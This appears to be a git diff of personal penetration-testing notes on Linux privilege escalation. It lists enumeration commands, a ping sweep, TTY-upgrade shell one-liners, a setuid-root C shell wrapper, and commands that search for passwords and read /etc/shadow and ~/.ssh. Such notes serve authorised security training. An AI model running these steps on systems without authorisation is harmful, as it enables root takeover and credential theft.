@@ -13,35 +13,46 @@
     for x in {1 .. 254};do (ping -c 1 l.l.l.$x | grep "bytes from" &); done | cut -d " "
 ## Scripts
 run [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) with increasing run levels, [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), [linenum](https://github.com/rebootuser/LinEnum) 
-## Checklists
+## Checklists / What to look for
 [gtfobins](https://gtfobins.github.io/) 
-- [ ] Sudo binaries?? 
-Scripts running as cron jobs you can write to?? 
-SUID binaries??   
-Services running as root??  
-Passwords / config files??  
-Is the kernel vulnerable?? 
+- [ ] Fully functional tty? 
+- [ ] su root? (no password, root, password) 
+- [ ] Sudo binaries? (sudo -l, cat /etc/sudoers)
+- [ ] Exploitable cronjobs? 
+- [ ] Weird SUID binaries?   
+- [ ] Services running as root?, services only available to localhost?
+- [ ] Passwords / config files?  
+- [ ] Is the kernel vulnerable? (last resort)
+[g0tm1lk checklist](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) 
 [Linux Priv Esc Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)  
+
 # Exploits
+## Upgrade to a fully functional TTY 
+    python -c 'import pty;pty.spawn("/bin/bash")' 
+    echo os.system('/bin/bash') 
+    /bin/sh -i 
+    /bin/bash -p 
 ## Cronjobs    
 look for scripts you can write to or exploit  
 
-    cat /etc/cronjobs   
+    cat /etc/crontab  
     crontab -l    
+    ls -al /etc/cron* 
 ## SUID Binaries
-    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;  2>/dev/null               
-    ps aux | grep “^root”                   
+    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;  2>/dev/null                                 
 ### Custom Executable
     int main(){
         setuid(0);
         system("/bin/bash -p");
     }
-## Services Running as Root 
+## Services Running as Root / Services Only Running Locally
     ps -aux | grep root
-    mysql exploit 
+    mysql running as root exploit 
+    ftp, telnet - tcpdump to sniff creds??
 ## Passwords / config files 
     find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \; 
-    /etc/passwd, /etc/shadow  read or write?? 
+    /etc/passwd, /etc/shadow, /etc/group  read or write?? 
+    cat ~/.ssh  
 ## Kernel Exploits 
     uname -a  
     cat /etc/*-release
